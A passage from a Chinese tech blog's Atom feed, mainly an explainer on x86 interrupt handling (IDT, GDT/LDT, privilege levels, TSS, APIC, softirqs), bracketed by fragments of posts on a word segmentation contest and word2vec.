href="http://www.meng.uno/utils/nlpc.pdf" target="_blank" rel="noopener">PPT下载</a></p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/649482ba/">http://home.meng.uno/articles/649482ba/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      纪念一下大四组织的一次中文分词小比赛。

分项数据
 * 训练数据： 链接: https://pan.baidu.com/s/1sl9JLqX 密码: 8am6
 * 测试数据： 链接: https://pan.baidu.com/s/1eSeYhfO 密码: cnw2
 * 相关参考答案： 链接: https://pan.baidu.com/s/1c2tVto0 密码: 3rpt
 * 有切分歧义的100个句子：链接: https://pan.baidu.com/s/1gfJ7Duz 密码: 8mmx

所有数据
所有文件下载：链接: https://pan.baidu.com/s/1smU
    
    </summary>
    
      <category term="Natural Language Processing" scheme="http://home.meng.uno/categories/Natural-Language-Processing/"/>
    
    
      <category term="NLP" scheme="http://home.meng.uno/tags/NLP/"/>
    
      <category term="中文分词" scheme="http://home.meng.uno/tags/%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D/"/>
    
  </entry>
  
  <entry>
    <title>中断</title>
    <link href="http://home.meng.uno/articles/81b224e1/"/>
    <id>http://home.meng.uno/articles/81b224e1/</id>
    <published>2017-08-06T14:38:33.000Z</published>
    <updated>2020-12-02T01:49:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1>什么是中断？</h1><p>中断是能够打断CPU指令序列的事件，它是在CPU内外，由硬件产生的电信号。CPU接收到中断后，就会向OS反映这个信号，从而由OS就会对新到来的数据进行处理。不同的事件，其对应的中断不同，而OS则是通过<strong>中断号</strong>(也即IRQ线)来找到对应的处理方法。不同体系中，中断可能是固定好的，也可能是动态分配的。</p><p>中断产生后，首先会告诉中断控制器。中断控制器负责收集所有中断源的中断，它能够控制中断源的优先级、中断的类型，指定中断发给哪一个CPU处理。</p><p>中断控制器通知CPU后，对于一个中断，会有一个CPU来响应这个中断请求。CPU会暂停正在执行的程序，转而去执行相应的处理程序，也即OS当中的中断处理程序。这里，中断处理程序是和特定的中断相关联的。</p><h1>中断描述符表</h1><p>那么CPU是如何找到中断服务程序的呢？为了让CPU由中断号去查找到对应的中断程序入口，就需要在内存中建立一张查询表，也即中断描述符(IDT)。在CPU当中，有专门的寄存器IDTR来保存IDT在内存中的位置。这里需要注意的是，常说的中断向量表，是在实模式下的，中断向量是直接指出处理过程的入口，而中断描述符表除了入口地址还有别的信息。</p><p>IDTR有48位，前32位保存了IDT在内存中的线性地址，后16位则是保存IDT的大小。而IDT自身，则是一个最大为256项的表（对应了8位的中断码），表中的每个向量，是一个入口。这里IDT表项的异常类型可以分为三种，其表项的格式也不同：</p><ul>  <li>任务门：利用新的任务方式去处理，需要切换TSS。它包含有一个进程的TSS段选择符，其偏移量部分没有用，linux没有采用它来进行任务切换。</li>  <li>中断门：适宜处理中断，在进入中断处理时，处理器会清IF标志，避免嵌套中断发生。中断门中的DPL(Descriptor privilege Level)为0，因此用户态不能访问中断门，中断处理程序都是用中断门来激活的，并且限制在内核态。</li>  <li>陷阱门：适宜处理异常，和中断门类似，但它不会屏蔽中断。</li></ul><p>以下是<strong>32bit</strong>中的IDT表项。</p><p><img src="http://www.meng.uno/images/%E4%B8%AD%E6%96%AD/IDT%E9%97%A8.gif" alt="IDT门"></p><p>值得注意的是，CPU还提供一种门，<strong>调用门</strong>，它是linux内核特别设置的，通常通过CALL和JMP指令来使用，能够转移特权级。</p><h1>实模式和保护模式</h1><p>在了解CPU是如何通过中断向量表调用具体的服务程序之前，首先需要了解CPU的工作方式。</p><p>对于IA-32架构，它支持实模式、保护模式和系统管理模式。</p><p><strong>实模式</strong>以拓展对方式实现了8086CPU的程序运行环境，处理器在刚刚上电和重启后时，处于实模式，其寻址空间最大为1M(2^20)。实模式的主要意义，在于提供更好的兼容性，开发者能够直接使用BIOS中断，从而在boot阶段不必关注硬件的具体实现。实模式主要还是为进入保护模式进行准备。</p><p>8086处理器有16-bit寄存器和16-bit的外部数据总线，但能够访问20-bit的地址，因为它引入了“分段机制”，一个16bit的段寄存器包含了一个64KB的段的基址。而段寄存器＋16bit的指针，就能够提供20bits的地址空间。其计算方式为：16位基地址左移4位＋16位偏移量＝20位。</p><p><strong>保护模式</strong>是处理器的根本模式。保护模式可以直接为实模式程序提供保护的，多任务的环境，这种特性被称为虚拟8086模式，它实际上是保护模式的一种属性。保护模式能够为任何任务提供这种属性。在保护模式中，地址依然通过“段＋偏移量”的形式来实现，但此时段寄存器中保存的不再是一个段的基址，而是一个索引。通过这个索引可以找到一个表项，里面存放了段基址等许多属性，这个表项也就是段描述符，而这个表也就是GDT表。</p><p>保护模式的最大寻址是2^32次方，也即4G，并且可以通过PAE模式访问超过4G的部分。它有4个安全级别，内存操作时，有安全检查。其分页功能带来了虚拟地址和物理地址的区别。</p><p><strong>系统管理模式</strong>为操作系统或者执行程序提供透明的机制去实现平台相关的特性，例如电源管理、系统安全。</p><p>对于Intel 64架构，它增加了两种子模式。</p><p><strong>兼容模式</strong>允许绝大部分16bit-32bit应用无需编译就能在64bit下运行，它类似于保护模式，有4G的地址空间限制。</p><p><strong>64bit模式</strong>在64bit线性地址空间上运行应用程序，通用寄存器被增加到64bits。它取消了分段机制，其默认地址长度为64bits。</p><h1>x64寻址</h1><p>在保护模式下(32bit)，物理地址的翻译分为两步：逻辑地址翻译(段)和线性地址翻译(页)。逻辑地址利用16bit segment selector和32bit offset来表示。处理器首先要将逻辑地址翻译为线性地址(32bit)。这个翻译过程如下：</p><ol>  <li>通过segment selector，在对应的GDT或LDT中去找到段描述符；</li>  <li>检查段描述符，访问是否合法，段是否能够访问，偏移量是否在范围之内；</li>  <li>将段基地址和偏移量相加来获取线性地址的值。</li></ol><p>在IA-32e模式下(64bit)，逻辑地址的翻译步骤和上述过程类似，唯一不同的是，其段基地址和偏移量，都是64bit，而不是32bit的。线性地址同理也是32bit的。</p><p>段寻址，也即将内存分成不同的段，利用段寄存器能够找到其对应的段描述符，从而获得相关的段基址、大小、权限等信息。</p><p><img src="http://www.meng.uno/images/%E4%B8%AD%E6%96%AD/%E6%AE%B5%E5%AF%BB%E5%9D%80.png" alt="段寻址"></p><p>段选择子Segment selector的示意图如下：</p><p><img src="http://www.meng.uno/images/%E4%B8%AD%E6%96%AD/%E6%AE%B5%E9%80%89%E6%8B%A9%E5%AD%90.png" alt="段选择子"></p><p>段选择子会被存在段寄存器当中，其中最低两位为RPL(cs寄存器不同，最低位位CPL)。而第三位Table Indicator则是表示该从GDT还是LDT寻找对应的段描述符，后面的bits就是对应的index了。</p><p>为了减少地址翻译的开销，处理器提供了6个段寄存器，CS，SS，DS，ES，FS，GS。通常来说一个程序至少有CS、DS、SS三个selector。假设程序要使用段来访问地址，那么必须将segment selector载入段寄存器当中。对此，Intel是提供了特殊的指令的，直接载入的指令包括MOV，POP，LDS，LES等。而隐含的载入则包括CALL，JMP，RET，SYSENTER等等。它们会改变CS寄存器(有时也会改变其它段寄存器)的内容。</p><p>而在IA-32e模式下(64bit mode)，ES，DS，SS段寄存器都不会使用了，因此它们的域会被忽视掉，而且某些load指令也被视为违法的，例如LDS。与ES，DS，SS段有关的地址计算，会被视为segment base为0。为了保证兼容性，在64bit mode当中，段load指令会正常执行，从GDT、LDT中读取时，也会读取寄存器的隐藏部分，并且值都会正常的载入。但是data、stack的segment selector和描述符都会被忽略掉。<br> 而FS和GS段在64bit mode能够手动使用，它们的计算方式为(FS/GS).base+index+displacement。用这种方式去进行内存访问时，是不会进行检查的。载入的时候不会载入Visible  Part，也即Segment Selector，也就是把段机制给忽略了。</p><h1>IDT，LDT和GDT</h1><p>中断向量表提供了一个入口，但这个入口还需要进一步的计算。这个入口的计算，是通过段寻址来实现的。而段的信息，则是保存在LDT和GDT当中。</p><p>段描述符的结构如下图：</p><p><img src="http://www.meng.uno/images/%E4%B8%AD%E6%96%AD/%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6.png" alt="段描述符"></p><p>段描述符最重要的部分是DPL位，它会在权限检查的时候使用。在进程需要装载一个新的段选择子时，会判断当前的CPL和RPL是否都比相应的DPL权限高，如果是则允许加载新的段选择子，否则产生GP。</p><p>在操作系统中，全局描述符只有一张，也即一个CPU对应一个GDT。GDT可以存放在内存中的任何地址，但CPU必须知道GDT的入口，因此有一个寄存器GDTR用来存放GDT的入口地址，它存放了GDT在内存中的基址和表长。</p><p><img src="http://www.meng.uno/images/%E4%B8%AD%E6%96%AD/GDT&amp;LDT.png" alt="GDT&amp;amp;LDT"></p><p>但是在64位系统当中，段机制就被取代了，而页表项也能够达到数据访问的保护目的。但是对于不同特权级之间的控制流转移，还是和原来的机制一样。在64-bit模式中，GDT依然存在，但不会改变，而其寄存器被拓展到了80bit。</p><p>而GDT中会包含一个LDT段的段描述符，LDT是通过它的段描述符来访问的。</p><p>在IA-32e模式下，段描述符表可以包含2^13个8-byte描述符。这里，描述符分为两种，段描述符会占据一个entry(8bit)，而系统描述符会占据两个entry(16bit)。而GDTR和LDTR被拓展为能够保存64bit的基地址。其中，IDT描述符、LDT、TSS描述符和调用门描述符都被拓展称为了16bytes。</p><p>64bit IDT描述符的格式如下</p><p><img src="http://www.meng.uno/images/%E4%B8%AD%E6%96%AD/64bitIDT.png" alt="64bit IDT"></p><p>64bit LDT描述符的格式如下</p><p><img src="http://www.meng.uno/images/%E4%B8%AD%E6%96%AD/64bitLDT.png" alt="64 bit LDT"></p><h1>中断的处理过程</h1><p>在intel 手册上看到的大图，很详细的解释了IA-32模式和IA-32e模式下的系统架构，它也就包含了中断处理和线性地址的翻译过程。</p><p><img src="http://www.meng.uno/images/%E4%B8%AD%E6%96%AD/IA-32.png" alt="IA-32"></p><p><img src="http://www.meng.uno/images/%E4%B8%AD%E6%96%AD/IA-32e.png" alt="IA-32e"></p><p>在中断产生之后，处理器会将中断向量号作为索引，在IDT表中找到对应的处理程序。IDT表将每个中断/异常向量和一个门描述符关联起来。在保护模式下，它是一个8-byte的描述符（与GDT，LDT类似），IDT最大有256项。IDT能够保存在内存中的任何位置，处理器用IDTR寄存器来保存它的值。</p><p>在中断/陷阱门描述符中，segment selector指向了GDT或当前LDT中的代码段描述符，而offser域指向了exception/interrupt的处理过程。</p><p><img src="http://www.meng.uno/images/%E4%B8%AD%E6%96%AD/Int.png" alt="IA-32e"></p><p>在执行call这一步的时候，倘若handler过程会在一个更低的权限执行，那么就会涉及到stack switch。当stack switch发生时，segment selector和新的栈指针都需要通过TSS来获取，在这个栈上，处理器会把之前的segment selector和栈指针压入栈中。处理器还将保存当前的状态寄存器在新的栈上。</p><p>如果handler过程会在相同的权限执行，处理器会把状态寄存器的值保存在当前的栈上。</p><p><img src="http://www.meng.uno/images/%E4%B8%AD%E6%96%AD/Stackswitch.png" alt="IA-32e"></p><p>从中断处理程序返回时，handler必须使用IRET指令。它与RET类似，但它会将保存的标志位恢复到EFLAGS寄存器中。如果stack switch在调用过程中发生了那么IRET会切换到中断前的stack上。在中断过程中，权限级的保护与CALL调用过程类似，会对CPL进行检查。</p><h1>64-bit模式下的中断处理</h1><p>在64bit模式下，中断和异常的处理与非64bit模式下几本一致，但也存在一些不同的地方。包括有：</p><ul>  <li>IDT所指向的代码是64bit代码</li>  <li>中断栈push的大小是64bit</li>  <li>栈指针(SS:RSP)在中断时，无条件的被push（保护模式下是由CPL来决定的）</li>  <li>当CPL有变化时，新的SS会被设置为NULL</li>  <li>IRET的过程不同</li>  <li>stack-switch的机制不同</li>  <li>中断stack的对齐不同</li></ul><p>其中，64bit的IDT门描述符在前面已经介绍了。IST（interrupt Stack Table）用于stack-switch。通过中断门来调用目标代码段时，它必须为一个64bit的代码段(CS.L=1,CS.D=0)。如果不是也会触发#GP。在IA-32e模式下，只有64bit的中断和陷阱门能够被调用，遗留的32bit中断/陷阱都被重新定义为64bit的。</p><p>在遗留模式中，IDT entry的大小是16/32bit，它决定了interrupt-stack-frame push时的大小。并且SS:ESP只在CPL发生改变时被压入stack中。在64bit模式下，interrupt-stack-frame push的大小被固定为8bytes(因为只有64bit模式的门能够被调用)，而且SS:RSP是无条件压入栈中的。遗留模式下，Stack pointer能够在任何地址进行push，但是IA-32e模式之下，RSP必须是16-byte边界对齐的，而stack  frame在中断处理程序被调用时也会对齐。而在中断服务结束时，IRET也会无条件的POP出SS:RSP，即使CPL=0。</p><p>IA-32e模式下，stack-switching机制被替代了，它被称为interrupt stack table(IST)。</p><p>遗留模式下，在64bit中，中断如果造成了权限级的改变，那么stack就会switch，但是这时不会载入新的SS描述符，而只会从TSS中载入一个inner-level的RSP。新的SS selector被强制设置为NULL，这样就能够处理内嵌的far transfers。而旧的SS和RSP会被保存在新的栈上。也就是说stack-switch机制除了SS selector不会从TSS加载之外，其余都一样。</p><p>而新的IST模式，则是无条件的进行stack switch。它是基于IDT表项中的一块区域实现的，它的设计目的，是为特殊的中断(NMI、double-fault、machine-check)等提供方法。在IA-32e模式下，一部分中断向量能够使用IST，另一部分能够使用遗留的方法。</p><p>IST在TSS中，提供7个IST指针，在中断门的描述符当中，由一个3bit的IST索引位，它们用来找到TSS中IST的偏移量。通过这个机制，处理器将IST所指向的值加载到RSP当中。而当中断发生时，新的SS selector被设置为NULL，并且SS selector的RPL区域被设置为新的CPL。旧的SS、RSP、RFLAGS、CS和RIP被push入新的栈中。如果IST的索引为0，那么就会使用修改后的、旧的stack-switch机制。</p><h1>保护机制</h1><p>Intel 64/IA-32架构提供了段/页级别的保护机制，它们利用权限级，来限制对于的段/页的访问，例如重要的OS代码和数据能够被放在更高权限级的段中，操作系统会保护它们不被应用程序访问。当保护机制启用时，每次内存访问都会被检查，这些检查包括：</p><ul>  <li>Limit</li>  <li>Tyep</li>  <li>Privilege level</li>  <li>Restriction of Procedure entry-points</li>  <li>Restriction of instruction set</li></ul><p>通过CR0寄存器当中的PE flag能够开启保护模式，打开段保护机制；而页保护机制则是在分页机制启用时，自动开启的。虽然64bit中，不再使用分段机制了，但<strong>代码段</strong>依然存在。对于地址计算来说，其段地址被视为0，CS描述符当中的内容被忽略，但其余部分保持一致。代码段描述符、selector依然存在，它们在处理器的操作模式、执行权限级上依然发挥作用。其工作方式如下：</p><p>CS描述符中会使用一个保留位，Bit 53被定义为64 bit flag位(L)，并且被用来在64bit/兼容模式之间切换。当CS.L ＝ 0时，CPU处于兼容模式，CS.D则决定了数据和地址的位数为16/32bit。如果CS.L为1，那么只有CS.D = 1是合法的，并且地址和数据的位数是64bit。在IA-32e模式下，CS描述符当中的DPL位被用来做执行权限的检查(与32bit模式一样)。</p><p><img src="http://www.meng.uno/images/%E4%B8%AD%E6%96%AD/%E4%BB%A3%E7%A0%81%E6%AE%B5.png?raw=true" alt="代码段"></p><h2 id="limit-checking">Limit Checking</h2><p>在段描述符当中，有一个limit field，它防止程序访问某个段之外的的内存位置，其有效值由G flag来决定，对于数据段来说，其limit还由E flag和B flag决定。在64bit模式下，处理器不会对代码段活着数据段进行limit check，但是会对<strong>描述符表</strong>的limit进行检查。</p><h2 id="type-checking">Type checking</h2><p>段描述符包含两个type 信息，S flag和type field。处理器会使用这个信息，来检查对段和门的不正确使用。S flag表示descriptor的类型，它包括系统/代码/数据三种类型。在处理一个段选择子时，处理器会在：</p><ul>  <li>将segment selector载入段寄存器：寄存器只能包含对应的描述符类型</li>  <li>指令访问段时：段只能被相应的指令访问</li>  <li>指令包含segment selector时：指令只能对某些特定类型的段/门进行访问</li>  <li>进行某些具体操作时：far call、far jump，对调用门、任务门的call/jump等，会判断描述符中的类型是否符合要求。</li></ul><h2 id="privilege-levels">Privilege levels</h2><p>处理器的段保护机制包含有4个privilege levels，从0到3，0最高，3最低。处理器利用这种机制，来防止一个低权限的进程，访问更高权限的部分。为了实现这个目的，处理器使用3种类型的权限级：</p><ul>  <li>CPL：当前执行任务的权限级。它保存在CS和SS段寄存器的bit 0-1中。通常，CPL和当前代码段的权限一致，当跳转到一个有不同权限的代码段时，CPL会发生变化。如果目标是一致代码段，则会延续当前的CPL。</li>  <li>DPL：segment或者gate的权限级。它保存在段或者门的描述符当中，当当前的代码段执行，需要访问一个段或者gate的时候，这个段/门的DPL就会被拿来与CPL和RPL进行比较。在不同的环境下，DPL的意义也是不同的。</li>  <li>RPL：与segment selector有关的，能够对权限进行覆盖的权限级。它保存在segment selector的bit 0-1中。处理器会通过CPL和RPL来判断对segment的访问是否合法。即使请求访问某个段的程序，拥有比段更高的权限，如果RPL不是有效的，访问还是会被拒绝。也就是说如果RPL把CPL高，那么RPL会覆盖CPL。RPL能够保证提权的代码，不能随意访问一个segment段，除非它自身有这个权限。直观的说，必须CPL和RPL都比DPL要高，只有这种情况下，才会允许这个段的访问。其主要目的，是允许高权限为低权限提供服务的时候，能够通过较低的权限来加载段。</li></ul><p>门调用符与权限检查：</p><p><img src="http://www.meng.uno/images/%E4%B8%AD%E6%96%AD/gate.png" alt="gate"></p><h1>TSS</h1><p>处理器执行工作的单位，被称为task。一个task分为两个部分，task的执行空间和task-state segment(TSS)。前者指的是code/stack/data segment，而后者则定义了组成前者的各个段。task是由TSS的segment selector来识别的。当一个任务被加载到处理器中执行时，segment selector、基址、limit、TSS的段描述符等都会被加载到**task register(TR)**当中去。分页启动时，页目录的基址还会载入到控制寄存器CR3当中去。</p><p>一个任务的状态，由一系列的寄存器和TSS来定义。这里，处理器定义了5个数据结构，来处理任务相关的活动。</p><ul>  <li>TSS</li>  <li>Task-gate描述符</li>  <li>TSS描述符</li>  <li>Task寄存器</li>  <li>EFLAGS寄存器中的NT flag</li></ul><p>为了恢复一个task，处理器所需要的信息，保存在一个系统段中，它被称为TSS。在64bit模式下，它的格式如下：</p><p><img src="http://www.meng.uno/images/%E4%B8%AD%E6%96%AD/64bitTSS.png" alt="gate"></p><p>而TSS描述符，则和其他的段一样，是由一个段描述符来定义的，它的结构在上文中已经给出了（与LDT是一致的），它只能放在GDT当中，不能放在LDT或者IDT当中。</p><p>Task寄存器保存了当前TSS的段选择子和整个段描述符。它包含可见和不可见两个部分（能否被软件修改）。段选择子位于可见部分，指向GDT当中的TSS描述符。不可见部分则是用来保存TSS的段描述符（能够提高执行效率）。</p><p><img src="http://www.meng.uno/images/%E4%B8%AD%E6%96%AD/TaskRegister.png" alt="gate"></p><h1>中断的发生</h1><p>中断指的是CPU在运行时，系统内发生了需要“急需处理”的事件，于是乎CPU暂停了当前正在执行对程序，转而去执行相应的时间处理程序，在处理完之后返回原来的地方执行。那么这些事件包含：（1）外部中断指的是那些CPU外的周边原件引发的中断，例如I/O中断，I/O设备异常（接下来我们把它称为“中断”）；（2）内部中断指的是在CPU内部执行时，由程序自身、异常、陷阱（例如程序中的断点）产生的中断（包括硬件中断和软件中断，其中软件中断是指一系列的指令）（接下来我们把它称作“异常”）。</p><p>这两种中断类型不同，产生方式也不一样：</p><p>（1）中断因为是由外设硬件发出的，所以需要由中断控制器（APIC）参与其中。在中断发出后，首先由APIC来进行处理。这种方式解决两个问题：（a）有大量的外设，而CPU的引脚资源有限，所以不能满足所有的直连需要；（b）如果设备中断和CPU直连，那么在MP系统中，中断负载等需求就无法实现了。</p><p>可以看到，在x86_64系统下，local APIC通过I/O APIC接受链接，I/O APIC把中断处理成中断消息，并按照规则转发给local APIC。APIC决定了由哪个CPU来处理中断，为某个引脚产生特定的中断向量（中断投递协议），并把中断请求发送给对应的CPU处理。CPU之间的中断通信，也是通过APIC来完成的。</p><p><img src="http://www.meng.uno/images/%E4%B8%AD%E6%96%AD/APIC.png" alt=""></p><p>I/O设备通过IRQ线与APIC相连，APIC将信号转化为对应的向量，并把这个向量放在它的I/O端口上，允许CPU通过数据总线来读这个向量；随后它发送一个信息给CPU的INTR引脚，从而触发中断，当CPU通过把中断信号写进APIC的I/O端口时，把INTR线清除。目前，外部中断的编号是从32开始，这是由于0-31号中断是留给异常和内部中断使用的，INTEL手册上也给出了这样一个表，详细说明了中断号的对应关系（新的CPU确实用的编号也变多了，就比如#VE）：</p><p><img src="http://www.meng.uno/images/%E4%B8%AD%E6%96%AD/table1.png" alt=""></p><p><img src="http://www.meng.uno/images/%E4%B8%AD%E6%96%AD/table2.png" alt=""></p><p>（2）异常则是由CPU自身产生的中断。那么这种中断是否需要APIC介入呢？除了I/O APIC的中断信号外，local APIC还会接收其他来源的中断，例如CPU LINT0/LINT1中断（本地连接的I/O），性能计数器中断、APIC内部错误中断等。但这不意味着所有异常都需要中断控制器的参与；软件中断的中断号是可以由指令直接给出的，因此是不需要中断控制器的参与的。</p><h1>中断的屏蔽</h1><p>注意，这里的中断屏蔽指的是对外部中断的屏蔽（mask）。CPU内部的中断（异常）是不能屏蔽的。在内核同步中，通常采用这种方式来屏蔽外部的中断；并结合自旋锁来保证中断不被打断。</p><p>IRQ和NMI分别是可屏蔽和不可屏蔽中断（例子：打印机中断和电源掉电）。CPU在处理NMI中断时，不从外部硬件接收中断向量号，其对应中断向量号固定为2。NMI中断通常用于故障处理（协处理器运算出错、存储器校验出错等危急事件）。NMI处理程序通常应以IRET指令来结束。IRQ则是可以屏蔽的一类中断，通过设置CPU中的IF位，可以对IRQ进行屏蔽，这个标志位可以通过软件来设置。例如在处理某个高优先级中断时，CPU收到了低优先级的中断，那么就会对它进行屏蔽。</p><p>而对于内核的同步，则是由操作系统内部来实现的。可以说，目前我们讨论的只是中断是如何被送到CPU的，而CPU把中断和异常送给操作系统，并操作系统做出反应的过程，则属于另一个范畴了（在另一片博文<a href="http://sec-lbx.tk/2017/02/15/%E4%B8%AD%E6%96%AD%E7%9B%B8%E5%85%B3/" target="_blank" rel="noopener">http://sec-lbx.tk/2017/02/15/中断相关</a>）。</p><h1>异常和中断的处理</h1><p>我们可以把内核，理解成一个服务器，它不断处理着用户的各种请求。因此，它需要保证每项服务在处理时，不会互相造成影响；其并发的来源包括内核的抢占和中断处理等。在内核态，中断处理程序也可以嵌套，这种情况下中断处理程序必须永不阻塞，在它运行的期间不能发生进程切换（不过缺页异常是一个例外，它不会引起进一步的异常，所以缺页异常可以切换进程，提高效率）。中断处理程序既可以抢占其他的中断处理程序，也可以抢占异常处理程序。相反的，异常处理程序<strong>从不会</strong>抢占中断处理程序。如果已经在内核态了，就只可能发生缺页异常（当然，也包含有现在的EPT缺页），但它们不会进一步的进行导致缺页的操作。<br>  异常处理程序通常包含三个部分：（1）在内核堆栈保存大多数寄存器的内容；（2）用高级的C函数对异常进行处理；（3）通过  <code>ret_from_exception()</code>函数，从异常处理程序退出。</p><p>中断处理程序与异常处理程序不同，因为当下运行的进程可能和中断完全无关。中断可以分为：I/O中断、时钟中断、处理器间中断。这里，以I/O中断为例。I/O中断必须能够为多个设备同时提供服务，而多个设备却可能会共享一个IRQ线。它往往包含四个部分：（1）在内核态堆栈中保存IRQ的值和寄存器的内容；（2）给为IRQ服务的PIC发一个应答，允许PIC进一步发出中断；（3）执行共享这个IRQ的所有设备的中断服务历程（<code>do_IRQ()</code>会执行与一个中断相关的所有中断服务历程，并且验证它的设备是否需要关注，这也与驱动注册相关）；（4）跳转到<code>ret_from_inrt()</code>后终止。</p><p>IRQ的动态分配：IRQ线可能在最后时刻才和一个设备驱动相关联，这样即使几个硬件设备不共享IRQ，也能够让几个设备在不同时刻使用同一个IRQ向量。</p><h1>处理器间的中断（IPI）</h1><p>由某个CPU向系统中的其他CPU发送中断信号，它不由IRQ总线，而是由本地APIC的总线传递。Linux定义了这样几种处理器间中断。</p><ul>  <li>CALL_FUNCTION：强制所有剩余CPU执行发送者传递过来的函数</li>  <li>RESCHEDULE_VECTOR：让被中断的CPU重新调度</li>  <li>INVALIDATE_TLB_VECTOR：强制CPU清洗TLB</li></ul><h1>软中断和tasklet</h1><p>软中断是一种提高运行效率的手段，其核心思想是把不紧迫懂、可以延时处理的中断部分，在中断上下文外，由操作系统自行安排运行时机来运行。tasklet则是建立在软中断之上来实现的，它是I/O驱动中实现可延迟函数的主要方法。对于挂起的软中断，内核会用<code>ksoftirqd</code>进行检查和运行。</p><h1>工作队列</h1><p>工作队列是内核中，另外一种将工作推后的形式。其特点在于，它允许<strong>重新调度</strong>和<strong>睡眠</strong>。其本质就是将工作交给内核线程处理。如果推后执行的任务需要睡眠、或者延时指定的时间再触发，则使用这种形式比较好；倘若推后的任务需要在一个tick内处理，那么还是选择软中断或者tasklet的形式比较好。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/81b224e1/">http://home.meng.uno/articles/81b224e1/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      什么是中断？
中断是能够打断CPU指令序列的事件，它是在CPU内外，由硬件产生的电信号。CPU接收到中断后，就会向OS反映这个信号，从而由OS就会对新到来的数据进行处理。不同的事件，其对应的中断不同，而OS则是通过中断号(也即IRQ线)来找到对应的处理方法。不同体系中，中断可能是固定好的，也可能是动态分配的。

中断产生后，首先会告诉中断控制器。中断控制器负责收集所有中断源的中断，它能够控制中断源的优先级、中断的类型，指定中断发给哪一个CPU处理。

中断控制器通知CPU后，对于一个中断，会有一个CPU来响应这个中断请求。CPU会暂停正在执行的程序，转而去执行相应的处理程序，也即OS当中的中断
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="Linux" scheme="http://home.meng.uno/tags/Linux/"/>
    
      <category term="系统安全" scheme="http://home.meng.uno/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
      <category term="操作系统" scheme="http://home.meng.uno/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>自然语言处理（NLP）之词向量</title>
    <link href="http://home.meng.uno/articles/5a3aed16/"/>
    <id>http://home.meng.uno/articles/5a3aed16/</id>
    <published>2017-07-05T12:09:21.000Z</published>
    <updated>2020-12-02T01:55:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1>背景知识</h1><h2 id="什么是词向量-词嵌入">什么是词向量/词嵌入</h2><ul>  <li>词向量（word embedding）是一个固定长度的实值向量</li>  <li>词向量是神经语言模型的<strong>副产品</strong>。</li>  <li>词向量是针对“词”提出的。事实上，也可以针对更细或更粗的粒度来进行推广——比如字向量、句向量、文档向量等</li></ul><h2 id="词向量的理解-todo">词向量的理解 TODO</h2><blockquote>  <p><a href="https://blog.csdn.net/itplus/article/details/37969817" target="_blank" rel="noopener">word2vec 中的数学原理详解（三）背景知识</a> - CSDN博客</p></blockquote><ul>  <li>在 NLP 任务中，因为机器无法直接理解自然语言，所以首先要做的事情就是将语言<strong>数学化</strong>——词向量就是一种数学化的方式。</li></ul><p><strong>分布式表示</strong> (distributed representation)</p><ul>  <li>分布式假设</li>  <li>TODO</li>  <li>常见的分布式表示方法    <ul>      <li>潜在语义分析 (Latent Semantic Analysis, LSA)        <ul>          <li>SVD 分解</li>        </ul>      </li>      <li>隐含狄利克雷分布 (Latent Dirichlet Allocation, LDA)，主题模型</li>      <li>神经网络、深度学习</li>    </ul>  </li></ul><h1>Word2Vec</h1><ul>  <li>Word2Vec 本质上也是一个神经语言模型，但是它的目标并不是语言模型本身，而是词向量；因此，其所作的一系列优化，都是为了更快更好的得到词向量</li>  <li>Word2Vec 提供了两套模型：<strong>CBOW</strong> 和 <strong>Skip-Gram</strong>(SG)    <ul>      <li>CBOW 在已知 <code>context(w)</code> 的情况下，预测 <code>w</code></li>      <li>SG 在已知 <code>w</code> 的情况下预测 <code>context(w)</code></li>    </ul>  </li>  <li>从训练集的构建方式可以更好的理解和区别 <strong>CBOW</strong> 和 <strong>SG</strong> 模型    <ul>      <li>        <p>每个训练样本为一个二元组 <code>(x, y)</code>，其中 <code>x</code>为特征，<code>y</code>为标签</p>        <p>假设上下文窗口的大小 <code>context_window =5</code>，即</p>        <div align="center"><img src="http://www.meng.uno/images/assets/公式_20180806115820.png" height=""></div>        <p>或者说 <code>skip_window = 2</code>，有 <code>context_window = skip_window*2 + 1</code></p>      </li>      <li>        <p>CBOW 的训练样本为：</p>        <div align="center"><img src="http://www.meng.uno/images/assets/公式_20180806120054.png" height=""></div>      </li>      <li>        <p>SG 的训练样本为：</p>        <div align="center"><img src="http://www.meng.uno/images/assets/公式_20180806120247.png" height=""></div>      </li>      <li>        <p>一般来说，<code>skip_window &lt;= 10</code></p>      </li>    </ul>  </li>  <li>除了两套模型，Word2Vec 还提供了两套优化方案，分别基于 Hierarchical Softmax (层次SoftMax) 和 Negative Sampling (负采样)</li></ul><h2 id="基于层次-softmax-的-cbow-模型">基于层次 SoftMax 的 CBOW 模型</h2><ul>  <li>    <p>【<strong>输入层</strong>】将 <code>context(w)</code> 中的词映射为 <code>m</code> 维词向量，共 <code>2c</code> 个</p>  </li>  <li>    <p>【<strong>投影层</strong>】将输入层的 <code>2c</code> 个词向量累加求和，得到新的 <code>m</code> 维词向量</p>  </li>  <li>    <p>【<strong>输出层</strong>】输出层对应一棵<strong>哈夫曼树</strong>，以词表中词作为叶子节点，各词的出现频率作为权重——共 <code>N</code> 个叶子节点，<code>N-1</code> 个非叶子节点</p>    <div align="center"><img src="http://www.meng.uno/images/assets/TIM截图20180806141616.png" height="400"></div>    <ul>      <li>【输入层】前者使用的是 <code>w</code> 的前 <code>n-1</code> 个词，后者使用 <code>w</code> 两边的词        <blockquote>          <p>这是后者词向量的性能优于前者的主要原因</p>        </blockquote>      </li>      <li>【投影层】前者通过拼接，后者通过<strong>累加求和</strong></li>      <li>【隐藏层】后者无隐藏层</li>      <li>【输出层】前者为线性结构，后者为树形结构</li>    </ul>  </li>  <li>    <p>模型改进</p>    <ul>      <li>从对比中可以看出，CBOW 模型的主要改进都是为了<strong>减少计算量</strong>——取消隐藏层、使用<strong>层Softmax</strong>代替基本Softmax</li>    </ul>  </li></ul><h3 id="层次-softmax-的正向传播">层次 SoftMax 